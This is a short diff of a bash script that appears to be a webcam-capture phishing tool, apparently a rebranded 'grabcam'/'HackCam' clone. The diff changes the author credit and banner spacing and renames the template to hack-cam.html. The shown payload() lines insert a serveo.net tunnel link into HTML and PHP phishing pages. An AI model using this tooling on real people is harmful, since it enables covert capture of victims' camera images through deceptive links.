@@ -45,14 +45,14 @@ echo '
                     |  _  | /    \ ( (__  |   /  ●● ( (__ /    \/ \/ \
                     |_| |_| \_/\_/  \___) |_|\_\ ●●  \___)\_/\_/\_)(_& v1.0 ' |lolcat
 echo " "
-printf "\033[0;35m            MY GITHUB: https://github.com/Benyamin/ \n"
-printf "\033[0;35m                    CREATE BY RED-SOCIAL\n"
+printf "\033[0;35m            MY GITHUB: https://github.com/Benyamin-creator/ \n"
+printf "\033[0;35m                    CREATE BY BENYAMIN-CREATOR\n"
 
 printf "\n"
 
 echo "             PLEASE TURN ON YOUR HOTSPOT
                    OR ELSE YOU DONT GET LINK....!"
-printf "\033[1;31m   ¡ENCIENDA EL HOTSPOT O NO DARÁ EL LINK!\n"
+printf "\033[1;31m      ¡ENCIENDA EL HOTSPOT O NO DARÁ EL LINK!\n"
 }
 
 stop() {
@@ -249,7 +249,7 @@ payload() {
 
 send_link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
 
-sed 's+forwarding_link+'$send_link'+g' grabcam.html > index2.html
+sed 's+forwarding_link+'$send_link'+g' hack-cam.html > index2.html
 sed 's+forwarding_link+'$send_link'+g' template.php > index.php
 
 
